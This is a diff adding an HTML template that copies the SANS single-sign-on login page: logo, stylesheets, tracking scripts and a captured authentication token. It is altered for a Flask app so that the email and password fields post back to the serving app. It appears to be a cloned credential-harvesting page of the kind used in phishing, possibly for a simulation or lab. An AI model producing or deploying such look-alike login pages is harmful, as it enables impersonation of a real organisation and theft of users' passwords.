@@ -1,0 +1,62 @@
+<!doctype html>
+<html>
+<head>
+    <title>SANS Login</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <!-- Google Tag Manager -->
+    <script nonce-data="37684db8ba5a703f1ad59b8a68b43216" nonce="37684db8ba5a703f1ad59b8a68b43216"  id="gtmScript">(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;var n=d.querySelector('[nonce]');n&&j.setAttribute('nonce',n.nonce||n.getAttribute('nonce-data'));f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-5T9DW3B');</script>
+    <!-- End Google Tag Manager -->
+
+    <link rel="stylesheet" type="text/css" href="https://idp.sans.org/simplesaml/module.php/sans/sans-responsive/css/web2021/main.css" />
+    <link rel="icon" href="https://idp.sans.org/simplesaml/module.php/sans/public/favicons/cropped-SANS-Blue-Square-32x32.png" sizes="32x32" />
+    <link rel="icon" href="https://idp.sans.org/simplesaml/module.php/sans/public/favicons/cropped-SANS-Blue-Square-192x192.png" sizes="192x192" />
+    <link rel="apple-touch-icon" href="https://idp.sans.org/simplesaml/module.php/sans/public/favicons/cropped-SANS-Blue-Square-180x180.png" />
+    <meta name="msapplication-TileImage" content="https://idp.sans.org/simplesaml/module.php/sans/public/favicons/cropped-SANS-Blue-Square-270x270.png" />
+<link href="{{ url_for('static', filename='main.css') }}" rel="stylesheet" type="text/css" />
+</head>
+<body>
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-5T9DW3B" height="0" width="0" style="display:none;visibility:hidden"></iframe>
+</noscript>
+<!-- End Google Tag Manager (noscript) -->
+<div class="logo">
+    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="180" height="75" viewBox="0 0 48 24">
+        <defs>
+            <path id="a" d="M.011.021h47.1V24H.01z"/>
+        </defs>
+        <g fill="none" fill-rule="evenodd">
+            <mask id="b" fill="#fff">
+                <use xlink:href="#a"/>
+            </mask>
+            <path fill="#004F6E" d="M5.458 9.536C3.583 6.669 1.866 4.873 1.866 2.888c0-1.449.731-2.34 1.876-2.34 1.684 0 3.082 2.554 3.463 7.081h.532V.335h-.532l-.699 1.387C5.744.682 4.726.02 3.742.02 1.803.021.246 1.927.246 5.298c0 3.56 1.557 5.962 3.4 8.735 2.002 2.992 3.178 5.218 3.178 7.014 0 1.417-.858 2.215-2.002 2.215-2.097 0-3.972-2.805-4.163-8.213H0v8.803h.659l.858-1.676C2.597 23.436 3.614 24 4.949 24c2.288 0 3.909-2.27 3.909-5.956 0-2.962-1.367-5.452-3.4-8.508M43.074 23.37c-1.844 0-3.517-2.284-4.022-6.309h4.721c.84 1.51 1.304 2.853 1.304 3.98 0 1.418-.858 2.33-2.003 2.33zm-16.926-7.063V4.306l5.24 12h-5.24zm-.888 3.342c0 2.236-.01 3.323-1.6 3.323h-1.006l-1.036-5.91h3.642v2.587zm-11.237-3.342l1.989-11.672 1.925 11.672h-3.914zM43.71 9.536c-1.874-2.867-3.59-4.663-3.59-6.648 0-1.449.73-2.34 1.874-2.34 1.685 0 3.083 2.554 3.464 7.081h.478V.335h-.478l-.699 1.387C43.997.682 42.98.02 41.994.02c-1.938 0-3.495 1.906-3.495 5.277 0 3.56 1.557 6.032 3.4 8.805.513.767.972 1.575 1.37 2.204h-4.306c-.023-.503-.04-.629-.051-1.258h-.713v1.258h-3.045V3.676c0-1.985.127-2.71 1.776-2.678V.335h-4.947v.663c1.522 0 2.157.914 2.157 2.993V14.42L28.49.335h-4.626v.63h1.395v15.342h-3.797L18.68.335h-2.797L12.01 19.727c-.382 1.953-.321 2.946-2.224 3.23v.644h5.2v-.644c-1.394-.032-1.774-.41-1.774-1.418 0-.441.034-.821.065-1.104l.575-3.374h4.258l.954 5.911h-1.794v.629h11.543v-.644c-1.776-.126-2.664-1.135-2.664-3.497V17.06h5.607l2.742 6.54h.657v-6.54H38.2v6.791h.713l.858-1.676C40.85 23.436 41.867 24 43.202 24c2.288 0 3.909-2.27 3.909-5.956 0-2.962-1.367-5.452-3.4-8.508z" mask="url(#b)"/>
+        </g>
+    </svg>
+
+</div>
+	<div class="title">
+		<h3>Log in</h3>
+	</div>
+	<form class="form-container" action="?" method="post" autocomplete="off" accept-charset="utf-8">
+        		<fieldset>
+			<input required="required" placeholder="Email address" name="username" id="username" type="text" inputmode="email" autocomplete="username" value="">
+			<input name="password" id="password" placeholder="Password" type="password" autocomplete="current-password">
+		</fieldset>
+		<div class="forgot-password">
+			<a href="../sans/forgotpassword.php?AuthState=_dfed802e916694eedbc5b8c908a7c9495a4094cc86%3Ahttps%3A%2F%2Fidp.sans.org%2Fsimplesaml%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttps%253A%252F%252Fwww.sans.org%252Fsimplesaml%252Fmodule.php%252Fsaml%252Fsp%252Fmetadata.php%252Fsans-live-sp%26RelayState%3Dhttps%253A%252F%252Fwww.sans.org%252Faccount%252Floginsso%26cookieTime%3D1683142339">I forgot my password</a>
+		</div>
+
+		
+		<div class="button-wrapper">
+			<input type="submit" class="button submit-button" id="regularsubmit" value="Login" />
+		</div>
+		<input type="hidden" name="AuthState" value="_dfed802e916694eedbc5b8c908a7c9495a4094cc86:https://idp.sans.org/simplesaml/saml2/idp/SSOService.php?spentityid=https%3A%2F%2Fwww.sans.org%2Fsimplesaml%2Fmodule.php%2Fsaml%2Fsp%2Fmetadata.php%2Fsans-live-sp&amp;RelayState=https%3A%2F%2Fwww.sans.org%2Faccount%2Floginsso&amp;cookieTime=1683142339" />
+		<p class="fancy">New to SANS?</p>
+        <div class="button-wrapper">
+            <a href="https://www.sans.org/account/create" class="button create-account">Create a SANS account</a>
+        </div>
+	</form>
+
+
+<script type="text/javascript" src="/_Incapsula_Resource?SWJIYLWA=719d34d31c8e3a6e6fffd425f7e032f3&ns=3&cb=662555833" async nonce="37684db8ba5a703f1ad59b8a68b43216"></script></body>
+</html>
